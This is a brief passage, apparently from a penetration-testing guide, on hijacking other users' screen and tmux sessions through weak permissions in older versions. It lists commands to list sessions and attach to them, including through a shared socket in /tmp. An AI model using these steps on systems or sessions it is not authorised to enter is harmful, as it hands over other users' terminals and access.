## Session Hijacking

In older versions, it was possible to exploit weak permissions in applications like **`screen`** and **`tmux`**, which allowed hijacking of sessions started by other users.

To perform this operation with `screen`:

```bash
# List available sessions
screen -ls

# Connect to the session
screen -dr [session]
```

To do it with `tmux`:

```bash
# List tmux sessions
tmux ls

# Connect to the session
tmux attach -t myname
tmux -S /tmp/dev_sess attach -t 0
```
